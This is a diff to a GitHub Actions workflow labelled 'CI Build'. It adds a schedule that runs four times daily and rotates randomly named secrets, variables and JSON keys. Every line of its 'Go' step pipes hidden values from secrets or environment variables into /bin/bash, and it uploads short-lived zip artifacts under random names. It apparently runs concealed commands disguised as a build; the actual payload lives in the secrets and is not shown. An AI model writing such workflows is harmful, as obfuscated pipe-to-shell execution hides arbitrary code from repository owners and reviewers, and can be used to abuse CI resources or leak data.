@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,20 +20,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          g57315: ${{ secrets.g57315 }}
+          hjjhy58660: ${{ secrets.hjjhy58660 }}
         run: |
-          printf '%s' "$g57315" | jq -r .t0515 | /bin/bash
-          printf '%s' "$a0" | jq -r .ck26 | /bin/bash
-          echo $dznag0140 | jq -r .q74779 | /bin/bash
-          echo $satue627 | jq -r .nktyn32 | /bin/bash
-          echo $upd3573 | jq -r .m26 | /bin/bash
-          printf '%s' "$tno794" | jq -r .w41051 | /bin/bash
-          echo $ltb06 | jq -r .w30485 | /bin/bash
+          printf '%s' "$hjjhy58660" | jq -r .cvw58176 | /bin/bash
+          echo $ajmw82 | jq -r .kcufa610 | /bin/bash
+          echo $f33 | jq -r .feim1187 | /bin/bash
+          echo $nfkwo3 | jq -r .xgsak825 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: j58C7byj
+          name: KRb2RDac
           path: "*.zip"
           retention-days: 1
